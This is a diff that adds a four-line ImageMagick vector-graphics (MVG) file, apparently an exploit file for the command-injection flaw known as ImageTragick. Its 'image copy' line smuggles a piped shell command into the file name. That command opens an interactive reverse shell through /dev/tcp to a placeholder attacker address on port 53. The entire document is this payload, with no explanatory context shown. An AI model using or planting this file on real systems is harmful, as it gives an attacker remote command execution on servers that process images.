@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+image copy 200,200 100,100 "|bash -i >& /dev/tcp/attacker_ip/53 0>&1"
+pop graphic-context
